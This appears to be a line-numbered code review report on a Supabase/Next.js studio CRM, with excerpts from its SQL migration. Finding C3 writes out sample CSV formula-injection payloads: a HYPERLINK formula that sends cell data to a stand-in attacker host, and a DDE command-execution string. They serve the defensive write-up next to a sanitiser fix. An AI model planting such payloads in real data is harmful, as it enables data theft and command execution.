37	## Critical — BLOCK deploy
38	
39	### C1. Migration will fail to apply — `UNIQUE (studio_id, lower(name))` is not valid Postgres syntax
40	**File:** `supabase/migrations/20260415000005_client_crm.sql:128`
41	**Issue:** Postgres does not allow functions in table-level `UNIQUE` constraints. Only column names and `UNIQUE NULLS NOT DISTINCT` qualifiers are allowed there. Expression-based uniqueness must be a partial/expression index.
42	**Impact:** `supabase migration up` will fail with `ERROR: syntax error at or near "lower"` — the entire Sprint 3 migration never lands. Every feature built on top of it (notes, tags, files, comms, consent, archive) is unreachable.
43	**Fix:**
44	```sql
45	-- Remove from CREATE TABLE:
46	-- CONSTRAINT client_tags_studio_name_unique UNIQUE (studio_id, lower(name))
47	
48	-- Replace with a functional unique index after CREATE TABLE:
49	CREATE UNIQUE INDEX client_tags_studio_name_unique
50	  ON public.client_tags (studio_id, lower(name));
51	```
52	Also add this to the rollback block (it's a distinct object now).
53	
54	---

56	### C2. `/api/client-tags/reorder` writes to a column that does not exist
57	**File:** `app/api/client-tags/reorder/route.ts:50-58`
58	**Migration:** `supabase/migrations/20260415000005_client_crm.sql:117-129` (no `sort_order` column)
59	**Types:** `lib/supabase/types.ts:973-1012` (no `sort_order` field)
60	**Issue:** The route builds `{ sort_order: index }` via `Object.assign(base, ...)` as `{ updated_at: string }` — this compile-passes only because the forced cast strips the real shape. The comment at line 46-49 claims the column exists but "may not be reflected in the generated type yet." It does not exist in the migration at all. This is exactly the kind of `Object.assign` bypass that hides a bug — flagged in the scope request (#8).
61	**Impact:** Every tag reorder call produces a no-op (the update sets only `updated_at`, the unknown `sort_order` key is silently stripped by PostgREST). UI reports success, order never persists. On page reload tags return to alphabetical.
62	**Fix (choose one):**
63	1. Add `sort_order INT NOT NULL DEFAULT 0` to `client_tags` in the migration, regenerate `lib/supabase/types.ts`, remove the `Object.assign` hack and use a typed `TagUpdate` like the sibling `[id]/route.ts`.
64	2. If sort is not a Sprint 3 deliverable: delete the `reorder` route and the UI that calls it.
65	
66	The `Object.assign` pattern must be removed either way — it defeats `noUncheckedIndexedAccess` / `exactOptionalPropertyTypes` exactly when those checks are protecting you.

70	### C3. CSV export is vulnerable to formula injection (Excel / Google Sheets RCE surface)
71	**File:** `app/api/clients/export/route.ts:51-67`
72	**Issue:** `Papa.unparse` does not escape cell values that begin with `=`, `+`, `-`, `@`, tab, or CR. Any client whose `first_name`, `last_name`, `email`, `phone`, `source`, or `tags` starts with one of those characters becomes an active formula when the CSV is opened in Excel, Google Sheets, LibreOffice Calc, or Numbers.
73	**Concrete attack:** a studio uploads a CSV of client imports. One "name" is `=HYPERLINK("http://attacker.example/s?c="&A2,"Click here")`. When the studio owner exports their client list and opens it in Excel, cell contents exfiltrate to the attacker. Worse patterns (`=cmd|'/C calc'!A1`) can execute OS commands on Windows with protected-view disabled.
74	**Impact:** A multi-tenant SaaS that exports user-controlled text to CSV without sanitisation is the textbook CWE-1236 case. GDPR-sensitive exports (client PII) make this doubly bad.
75	**Fix:** Prefix any field whose first character is in `{= + - @ \t \r}` with a single-quote (`'`). Apply inside the `rows` map:
76	```ts
77	function sanitiseCsvCell(value: unknown): string {
78	  const s = value == null ? '' : String(value)
79	  return /^[=+\-@\t\r]/.test(s) ? `'${s}` : s
80	}
81	```
82	Apply to every cell (not just name/email — tags and source too). Then `Papa.unparse(rows.map(r => mapValues(r, sanitiseCsvCell)))`.

88	### M1. `/api/client-notes` and `/api/client-files` expose POST but the UI calls GET
89	**Files:**
90	- `app/api/client-notes/route.ts` (only exports POST)
91	- `components/clients/notes/ClientNotesTab.tsx:43` (calls `GET /api/client-notes?client_id=…`)
92	- `app/api/client-files/route.ts` (only exports POST)
93	- `components/clients/files/ClientFilesTab.tsx:27` (calls `GET /api/client-files?client_id=…`)
94	**Issue:** Next.js returns 405 Method Not Allowed on unhandled verbs. The UI `refetch` path is broken for both notes and files. Initial SSR works (data is passed via `initialNotes` / `initialFiles` props), but any in-app refresh (category filter change, after upload, after delete) silently fails. `res.ok` is false → the UI sits on stale state.
95	**Fix:** Add GET handlers to both route files scoped to `studio_id` + optional `?client_id=` param, with pagination. Mirror the `/api/client-communications/route.ts` shape.
96	
97	### M2. Note DELETE silently succeeds when RLS denies
98	**File:** `app/api/client-notes/[id]/route.ts:83-94`
99	**Migration:** `supabase/migrations/20260415000005_client_crm.sql:92-108` (delete restricted to author OR owner/admin)
100	**Issue:** Supabase `.delete()` with no row matches (because the RLS policy denied it) returns `{ error: null }`. The route then returns `{ success: true }` and the optimistic UI removes the note. On page reload the note is back — staff user loses trust in the UI.
101	**Fix:** Select first, then delete, then verify `count` — or use `.delete({ count: 'exact' })` and check `count === 1`:
102	```ts
103	const { error, count } = await supabase
104	  .from('client_notes')
105	  .delete({ count: 'exact' })
106	  .eq('id', id)
107	  .eq('studio_id', authUser.studioId)
108	if (error) return NextResponse.json({ error: 'Failed to delete note' }, { status: 500 })
109	if (count === 0) return NextResponse.json({ error: 'Not allowed to delete this note' }, { status: 403 })
110	```

115	- `components/clients/files/FileUploader.tsx:37-44` (allows `image/webp`, `application/msword`, `.docx`)
116	- `app/api/client-files/route.ts:8` + `14` (allows `pdf, jpeg, png, heic, heif` only)
117	- `supabase/migrations/20260415000005_client_crm.sql:521-527` (bucket MIME whitelist matches server, not client)
118	**Issue:** User drags a `.webp` or `.docx`. Client validator: "valid". Server: 400 "File type not allowed." Worse, the migration whitelists `image/heic` and `image/heif` but the client `FileUploader` doesn't. iPhone users can't upload `.HEIC` files.

122	**File:** `app/api/clients/search/route.ts:40-46`
123	**Issue:** The scope doc explicitly required Sprint 2's `ClientFinder` (used by AppointmentDrawer + AddToWaitlistForm) to exclude archived clients after Sprint 3 added `archived_at`. The search route has no `.is('archived_at', null)` filter, so archived clients appear in the autocomplete — staff can create bookings for archived clients and a receptionist can "un-archive" via the side door.
124	**Fix:** Add `.is('archived_at', null)` to the `.select(…).eq(…)` chain.
125	```ts
126	.eq('studio_id', authUser.studioId)
127	.is('archived_at', null)                    // <-- add
128	.textSearch('fts', q, { type: 'websearch' })
129	```

134	**Fix (low cost):** regen types with `pnpm supabase gen types typescript --project-id <id> > lib/supabase/types.ts`; the RPC return type will be emitted, replace the manual intersection with `Database['public']['Functions']['get_client_profile']['Returns']`.

412	-- 7. TRIGGER: update_client_crm_stats
413	-- Extends the booking status-change event to maintain:
414	--   lifetime_value_cents, avg_session_value_cents,
415	--   no_show_count, cancellation_count
416	--
417	-- The existing update_client_stats() trigger on bookings handles
418	-- total_sessions and total_spent_cents. This new function handles
419	-- the Sprint 3 columns and is added as a SEPARATE trigger on the
420	-- same table (Postgres fires multiple triggers in name order).
421	-- Naming: 'bookings_update_client_crm_stats' fires after
422	-- 'bookings_update_client_stats' alphabetically — consistent.
423	-- =============================================================
424	
425	CREATE OR REPLACE FUNCTION public.update_client_crm_stats()
426	RETURNS TRIGGER
427	LANGUAGE plpgsql
428	SECURITY DEFINER
429	SET search_path = public
430	AS $$
431	DECLARE
432	  v_total_sessions    INT;
433	  v_total_value_cents INT;
434	BEGIN
435	  -- -------------------------------------------------------
436	  -- no_show tracking
437	  -- -------------------------------------------------------
438	  IF NEW.status = 'no_show' AND (OLD.status IS DISTINCT FROM 'no_show') THEN
439	    UPDATE public.clients
440	       SET no_show_count = no_show_count + 1,
441	           updated_at    = now()
442	     WHERE id = NEW.client_id;
443	  END IF;
444	
445	  -- Reverse if corrected back from no_show
446	  IF OLD.status = 'no_show' AND (NEW.status IS DISTINCT FROM 'no_show') THEN
447	    UPDATE public.clients
448	       SET no_show_count = GREATEST(0, no_show_count - 1),
449	           updated_at    = now()
450	     WHERE id = NEW.client_id;
451	  END IF;
452	
453	  -- -------------------------------------------------------
454	  -- cancellation tracking
455	  -- -------------------------------------------------------
456	  IF NEW.status = 'cancelled' AND (OLD.status IS DISTINCT FROM 'cancelled') THEN
457	    UPDATE public.clients
458	       SET cancellation_count = cancellation_count + 1,
459	           updated_at         = now()
460	     WHERE id = NEW.client_id;
461	  END IF;
462	
463	  -- Reverse if corrected back from cancelled
464	  IF OLD.status = 'cancelled' AND (NEW.status IS DISTINCT FROM 'cancelled') THEN
465	    UPDATE public.clients
466	       SET cancellation_count = GREATEST(0, cancellation_count - 1),
467	           updated_at         = now()
468	     WHERE id = NEW.client_id;
469	  END IF;
470	
471	  -- -------------------------------------------------------
472	  -- lifetime_value_cents + avg_session_value_cents
473	  -- Recomputed from total_spent_cents (maintained by the existing
474	  -- update_client_stats trigger) whenever status → completed or
475	  -- status ← completed (correction). total_sessions is also
476	  -- maintained by update_client_stats so we read it fresh.
477	  -- -------------------------------------------------------
478	  IF (NEW.status = 'completed' AND (OLD.status IS DISTINCT FROM 'completed'))
479	  OR (OLD.status = 'completed' AND (NEW.status IS DISTINCT FROM 'completed'))
480	  THEN
481	    SELECT total_sessions, total_spent_cents
482	      INTO v_total_sessions, v_total_value_cents
483	      FROM public.clients
484	     WHERE id = NEW.client_id;
485	
486	    UPDATE public.clients
487	       SET lifetime_value_cents    = v_total_value_cents,
488	           avg_session_value_cents = CASE
489	             WHEN v_total_sessions > 0
490	             THEN v_total_value_cents / v_total_sessions
491	             ELSE 0
492	           END,
493	           updated_at = now()
494	     WHERE id = NEW.client_id;
495	  END IF;
496	
497	  RETURN NEW;
498	END;
499	$$;

639	    -- Core client fields
640	    'id',                     v_client.id,
641	    'studio_id',              v_client.studio_id,
642	    'first_name',             v_client.first_name,
643	    'last_name',              v_client.last_name,
644	    'email',                  v_client.email,
645	    'phone',                  v_client.phone,
646	    'date_of_birth',          v_client.date_of_birth,
647	    'address',                v_client.address,
648	    'source',                 v_client.source,
649	    'referral_source',        v_client.referral_source,
650	    'tags',                   v_client.tags,
651	    'notes',                  v_client.notes,
652	    'preferred_contact',      v_client.preferred_contact,
653	    'consent_minor',          v_client.consent_minor,
654	    'archived_at',            v_client.archived_at,
655	    -- Stats
656	    'total_sessions',         v_client.total_sessions,
657	    'total_spent_cents',      v_client.total_spent_cents,
658	    'lifetime_value_cents',   v_client.lifetime_value_cents,
659	    'avg_session_value_cents',v_client.avg_session_value_cents,
660	    'no_show_count',          v_client.no_show_count,
661	    'cancellation_count',     v_client.cancellation_count,
662	    'loyalty_points',         v_client.loyalty_points,
663	    'last_visit_at',          v_client.last_visit_at,
664	    -- Sprint 3 enrichments
665	    'pinned_notes',           v_pinned,
666	    'consent_preferences',    v_consent,
667	    -- Counts (inline subqueries — avoid N+1 in app layer)
668	    'booking_count',          (
669	      SELECT count(*)::int
670	        FROM public.bookings b
671	       WHERE b.client_id = p_client_id

685	    ),
686	    -- Timestamps
687	    'created_at',             v_client.created_at,
688	    'updated_at',             v_client.updated_at

690

699	-- 10. RPC: bulk_tag_clients
700	-- Atomically add/remove tag strings in clients.tags for a batch
701	-- of client IDs. Validates all clients belong to the caller's studios.
702	-- Returns count of rows updated.
703	-- =============================================================
704	
705	CREATE OR REPLACE FUNCTION public.bulk_tag_clients(
706	  p_client_ids   uuid[],
707	  p_tags_to_add  text[],
708	  p_tags_to_remove text[]
709	)
710	RETURNS int
711	LANGUAGE plpgsql
712	SECURITY DEFINER
713	VOLATILE
714	SET search_path = public
715	AS $$
716	DECLARE
717	  v_updated_count INT;
718	BEGIN
719	  -- Authenticated callers only
720	  IF auth.uid() IS NULL THEN
721	    RAISE EXCEPTION 'unauthenticated';
722	  END IF;
723	
724	  -- Reject empty input (no-op but guard against accidental full-table update)
725	  IF array_length(p_client_ids, 1) IS NULL THEN
726	    RETURN 0;
727	  END IF;
728	
729	  -- Validate: all supplied client IDs must belong to one of the caller's studios.
730	  -- If any ID is outside the caller's scope the entire call is rejected.
731	  IF EXISTS (
732	    SELECT 1
733	      FROM public.clients c
734	     WHERE c.id = ANY(p_client_ids)
735	       AND c.studio_id != ALL(public.user_studio_ids())
736	  ) THEN
737	    RAISE EXCEPTION 'forbidden: one or more client_ids are outside your studio access';
738	  END IF;
739	
740	  -- Apply tag mutations atomically:
741	  --   1. array_cat(tags, p_tags_to_add)  → append new tags
742	  --   2. ARRAY(SELECT unnest ... EXCEPT SELECT unnest p_tags_to_remove) → remove unwanted
743	  --   3. array_remove(array_agg(distinct x), NULL) → deduplicate
744	  UPDATE public.clients
745	     SET tags = ARRAY(
746	           SELECT DISTINCT unnest(
747	             array_cat(
748	               CASE WHEN array_length(p_tags_to_add, 1) IS NOT NULL
749	                    THEN array_cat(tags, p_tags_to_add)
750	                    ELSE tags
751	               END,
752	               '{}'::text[]
753	             )
754	           )
755	           EXCEPT
756	           SELECT unnest(
757	             CASE WHEN array_length(p_tags_to_remove, 1) IS NOT NULL
758	                  THEN p_tags_to_remove
759	                  ELSE '{}'::text[]
760	             END
761	           )
762	         ),
763	         updated_at = now()
764	   WHERE id = ANY(p_client_ids)
765	     AND studio_id = ANY(public.user_studio_ids());
766	
767	  GET DIAGNOSTICS v_updated_count = ROW_COUNT;
768	  RETURN v_updated_count;
769	END;
770	$$;
771	
772	-- Grant to authenticated only
773	GRANT EXECUTE ON FUNCTION public.bulk_tag_clients(uuid[], text[], text[]) TO authenticated;
